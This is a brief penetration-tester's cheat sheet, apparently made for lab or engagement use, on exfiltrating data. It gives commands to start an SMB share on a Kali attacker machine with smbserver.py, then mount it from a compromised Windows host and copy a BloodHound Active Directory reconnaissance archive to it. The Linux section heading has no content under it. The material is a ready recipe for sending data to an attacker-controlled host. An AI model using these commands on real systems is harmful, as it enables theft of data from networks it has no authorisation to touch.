# Exfiltration options

## Windows

### SMB service

1. Run SMB on kali:

`smbserver.py xxxshare . -smb2support -username xxx -password xxx`

2. Exfiltrate data from Windows host:

```
net use \\10.10.10.xxx\xxxshare /u:xxx xxx

copy 20191018035324_BloodHound.zip \\10.10.10.xxx\xxxshare\
```

## Linux